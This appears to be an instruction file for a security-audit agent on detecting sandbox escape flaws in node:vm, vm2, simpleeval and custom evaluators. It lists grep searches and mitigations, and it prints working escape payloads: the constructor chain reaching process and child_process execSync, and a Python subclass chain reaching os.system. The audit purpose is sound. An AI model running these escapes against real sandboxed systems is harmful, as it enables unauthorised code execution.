---
name: sandbox-escape
description: "Detect VM/sandbox escape vulnerabilities in packages using node:vm, simpleeval, or custom sandboxes that can be bypassed to achieve code execution."
metadata:
  filePattern:
    - "**/*.js"
    - "**/*.ts"
    - "**/*.py"
  bashPattern:
    - "grep.*(vm\\.run|vm\\.create|simpleeval|sandbox)"
  priority: 88
---

# Sandbox Escape Detection

## When to Use

Audit any package that uses node:vm, vm2, isolated-vm, simpleeval, RestrictedPython, or custom expression evaluators to run untrusted code.

## Key Insight

**node:vm is NOT a security mechanism.** The Node.js documentation explicitly states this. Constructor chains ALWAYS escape the sandbox. If a package uses `vm.runInNewContext()` to isolate untrusted code, it is vulnerable.

## The Constructor Chain (node:vm)

The fundamental escape from node:vm:
```js
// Inside vm.runInNewContext({}, {}):
this.constructor.constructor('return process')()
// Returns the real process object from the host
```

Then achieve RCE:
```js
const process = this.constructor.constructor('return process')();
process.mainModule.require('child_process').execSync('id').toString();
```

### Why This Works

1. `this` refers to the sandbox object
2. `this.constructor` is `Object` (from the outer realm)
3. `Object.constructor` is `Function` (from the outer realm)
4. `Function('return process')()` executes in the outer realm
5. `process` gives access to `require` and the full Node.js API

## Process

### Step 1: Find Sandbox Usage

```
# node:vm
grep -rn "require.*vm.*\|from.*vm" . --include="*.js" --include="*.ts"
grep -rn "vm\.runIn\|vm\.createContext\|vm\.Script\|vm\.compileFunction" .
grep -rn "new Script\|runInNewContext\|runInThisContext\|runInContext" .

# vm2 (deprecated)
grep -rn "require.*vm2\|from.*vm2\|new VM(\|new NodeVM(" .

# Python sandboxes
grep -rn "simpleeval\|SimpleEval\|EvalWithCompoundTypes" .
grep -rn "RestrictedPython\|compile_restricted" .
grep -rn "ast\.literal_eval" .

# Custom sandboxes
grep -rn "sandbox\|safeEval\|safe_eval\|secure_eval" .
```

### Step 2: Identify the Sandbox Mechanism

| Mechanism | Security Level | Notes |
|-----------|---------------|-------|
| node:vm | NONE | Not a security boundary. Always escapable. |
| vm2 | LOW-MEDIUM | Deprecated. Multiple CVEs. Check version. |
| isolated-vm | HIGH | Separate V8 isolate. Genuinely isolated. |
| quickjs-emscripten | HIGH | Separate engine in Wasm. |
| Python simpleeval | MEDIUM | Safe for simple expressions. Check version. |
| Python ast.literal_eval | HIGH | Only allows literals. Safe. |
| RestrictedPython | MEDIUM | Check version for known bypasses. |
| Custom eval wrappers | LOW | Almost always bypassable. |

### Step 3: Test Escape Vectors

For node:vm, try these in order:
1. Constructor chain: `this.constructor.constructor('return process')()`
2. arguments.callee.caller (if in function context)
3. Error stack inspection
4. Proxy/Reflect objects (if available in sandbox)
5. Symbol.hasInstance override
6. Dynamic import() (if supported)

For Python, try:
1. `().__class__.__base__.__subclasses__()` -- access all loaded classes
2. `''.__class__.__mro__[1].__subclasses__()` -- string class hierarchy
3. Function object access: `func.__globals__`, `func.__code__`
4. `__builtins__` access through various chains

### Step 4: Check for Mitigations

```
grep -rn "freeze\|preventExtensions\|defineProperty" .  # Object hardening
grep -rn "Proxy\|handler\|revocable" .  # Proxy-based protection
grep -rn "whitelist\|allowlist\|blocklist" .  # Function filtering
```

## Common Escape Patterns

### Pattern 1: node:vm Direct Escape
```js
const vm = require('vm');
const sandbox = {};
vm.runInNewContext('this.constructor.constructor("return process")()', sandbox);
// Returns the real process object
```

### Pattern 2: Python simpleeval Class Hierarchy
```python
from simpleeval import simple_eval
# Access os module through class hierarchy
simple_eval("().__class__.__base__.__subclasses__()[X].__init__.__globals__['os'].system('id')")
```

### Pattern 3: Custom Sandbox Bypass
```js
// Custom "safe" eval that blocks require/process/global
function safeEval(code) {
  return new Function('require', 'process', 'global', code)(undefined, undefined, undefined);
}
// Bypass: arguments.callee.caller gives access to outer scope
// Or: this.constructor.constructor('return process')()
```

## CVSS Guidance

- Sandbox escape to RCE (unauthenticated): CRITICAL 9.8-9.9
- Sandbox escape to RCE (authenticated): HIGH 8.8
- Sandbox escape with limited impact: HIGH 7.5
- node:vm used for security = always CRITICAL (it is not a security mechanism)

## References

- [Sinks](references/sinks.md) -- Sandbox mechanisms and escape patterns
- [False Positive Indicators](references/false-positive-indicators.md) -- When escape is blocked
- [PoC Skeleton](references/poc-skeleton.md) -- Sandbox escape PoC templates
